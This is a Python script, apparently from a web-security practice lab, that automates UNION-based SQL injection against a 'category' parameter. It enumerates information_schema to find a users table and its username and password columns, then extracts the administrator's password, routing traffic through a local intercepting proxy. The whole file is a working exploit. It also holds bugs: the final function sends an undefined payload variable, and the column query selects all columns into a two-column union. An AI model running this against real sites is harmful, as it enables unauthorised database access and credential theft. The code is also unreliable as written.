import requests
import sys
import urllib3 
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}

def perform_request(url,sql_payload):
    path = "/filer?category="
    r = requests.get(url+ path+sql_payload,verify=False,proxies=proxies)
    return r.text


def sqli_users_table(url):
    sql_payload = " ' UNION SELECT table_name,null FROM information_schema.tables--"
    res = perform_request(url,sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table=soup.find(text=re.compile('.*users.*')) #it will retrieve the strings of the left and the right side of the users
    if users_table:
        return users_table
    else:
        return False

def sqli_users_columns(url,users_table):
    sql_payload= "' UNION SELECT * FROM information_schema.columns WHERE table_name = '%s'--"%users_table
    res=perform_request(url,sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column= soup.find(text=re.compile('.*username.*'))
    password_column= soup.find(text=re.compile('.*password.*'))
    return username_column,password_column


def sqli_administrator_cred(url,users_table,username_column,password_column):
    sqli_payload="' UNION select %s, %s from %s--"%(username_column,password_column,users_table)
    res = perform_request(url,sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password=soup.find(text="administrator").parent.findNext('td').contents[0]
    #it will go to the parent element and went to the next td element which is password
    return admin_password


if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    print("Looking for a users table.....")
    users_table = sqli_users_table(url)
    if users_table:
        print("Found the users table name:%s"%users_table)
        username_column,password_column = sqli_users_columns(url,users_table)
        if username_column and password_column:
            print("Found the username column name:%s"%username_column)
            print("Found the password column name:%s"%password_column)

            admin_password=sqli_administrator_cred(url,users_table,username_column,password_column)
            if admin_password:
                print("The admin pass is : %s"%admin_password)
            else:
                print("admin pass didn't found")
        else:
            print("Didn't find the username or password")
    else:
        print("Did not find a users table.")

